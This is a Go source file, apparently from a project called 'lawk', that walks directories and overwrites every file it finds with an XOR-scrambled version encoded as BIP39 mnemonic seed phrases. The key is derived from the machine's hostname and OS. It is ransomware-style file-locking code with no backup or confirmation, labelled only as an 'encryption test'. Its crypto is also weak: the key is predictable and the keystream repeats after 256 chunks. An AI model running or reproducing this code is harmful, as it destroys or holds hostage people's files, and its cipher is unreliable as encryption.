package enc

import (
	"crypto/sha256"

	"fmt"
	"io/ioutil"
	"log"
	"os"
	"runtime"
	"strings"
	"lawk/pkg/walk"
	"github.com/tyler-smith/go-bip39"
)

func EncryptFiles() error {
	masterKey, err := generateMasterKey()
	if err != nil {
		return fmt.Errorf("failed to generate master key: %w", err)
	}
	files, err := walk.Walk()
	if err != nil {
		return fmt.Errorf("failed to walk directories: %w", err)
	}

	fmt.Printf("Found %d files to encrypt with mnemonic seed phrases...\n", len(files))
	for _, filePath := range files {
		err := encryptFileWithMnemonic(filePath, masterKey)
		if err != nil {
			log.Printf("Failed to encrypt %s: %v", filePath, err)
			continue
		}
	}
	fmt.Println("[+] encryption complete!")
	return nil
}

func generateMasterKey() ([]byte, error) {
	hostname, err := os.Hostname()
	if err != nil {
		return nil, fmt.Errorf("failed to get hostname: %w", err)
	}
	osInfo := runtime.GOOS + runtime.GOARCH
	hasher := sha256.New()
	hasher.Write([]byte(hostname))
	hasher.Write([]byte(osInfo))
	hasher.Write([]byte("lawk-mnemonic-seed"))
	
	key := hasher.Sum(nil)
	return key, nil
}

func encryptFileWithMnemonic(filePath string, masterKey []byte) error {
	originalData, err := ioutil.ReadFile(filePath)
	if err != nil {
		return fmt.Errorf("failed to read file: %w", err)
	}
	if len(originalData) == 0 {
		return nil
	}
	hasher := sha256.New()
	hasher.Write(masterKey)
	hasher.Write([]byte(filePath))
	fileSeed := hasher.Sum(nil)
	mnemonicContent, err := convertToMnemonic(originalData, fileSeed)
	if err != nil {
		return fmt.Errorf("failed to convert to mnemonic: %w", err)
	}

	err = ioutil.WriteFile(filePath, []byte(mnemonicContent), 0644)
	if err != nil {
		return fmt.Errorf("failed to write mnemonic file: %w", err)
	}
	return nil
}

func convertToMnemonic(data []byte, seed []byte) (string, error) {
	var mnemonicLines []string
	chunkSize := 16 
	for i := 0; i < len(data); i += chunkSize {
		end := i + chunkSize
		if end > len(data) {
			end = len(data)
		}
		
		chunk := data[i:end]
		chunkIndex := i / chunkSize
		paddedChunk := make([]byte, 16)
		copy(paddedChunk, chunk)
		if len(chunk) < 16 {
			paddedChunk[15] = byte(len(chunk))
		}
		hasher := sha256.New()
		hasher.Write(seed)
		hasher.Write([]byte{byte(chunkIndex)})
		keyStream := hasher.Sum(nil)
		for j := range paddedChunk {
			paddedChunk[j] ^= keyStream[j]
		}
		entropy := paddedChunk[:16]
		mnemonicPhrase, err := bip39.NewMnemonic(entropy)
		if err != nil {
			return "", fmt.Errorf("failed to create mnemonic: %w", err)
		}
		if mnemonicPhrase == "" {
			return "", fmt.Errorf("failed to generate mnemonic words")
		}
		mnemonicLines = append(mnemonicLines, mnemonicPhrase)
	}
	header := "# mnemonic seed phrase encryption test :3\n"
	return header + strings.Join(mnemonicLines, "\n") + "\n", nil
}


